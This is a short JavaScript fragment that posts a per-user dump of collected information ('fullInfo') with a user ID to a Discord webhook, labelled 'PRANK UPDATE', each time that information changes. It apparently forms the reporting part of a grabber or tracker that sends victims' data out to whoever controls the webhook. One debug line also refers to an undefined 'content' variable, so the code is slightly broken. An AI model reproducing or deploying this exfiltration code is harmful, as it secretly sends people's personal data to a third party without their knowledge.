if (!last || JSON.stringify(last) !== JSON.stringify(fullInfo)) {
  if (DISCORD_WEBHOOK) {
    try {
      console.log('Attempting Discord send with content length:', content.length);  // Add this
      await axios.post(DISCORD_WEBHOOK, {
        content: `PRANK UPDATE (${new Date().toLocaleString()})\nUser: ${userID}\n` +
          Object.entries(fullInfo).map(([k, v]) => `${k}: ${v}`).join('\n')
      });
      console.log('Discord message sent successfully');
    } catch (discordErr) {
      console.error('Discord send failed:', discordErr.message);
      if (discordErr.response) {
        console.error('Discord response:', discordErr.response.data);  // This shows {"message": "...", "code": 50006} etc.
      }
    }
  } else {
    console.log('No webhook - skipping');
  }
}
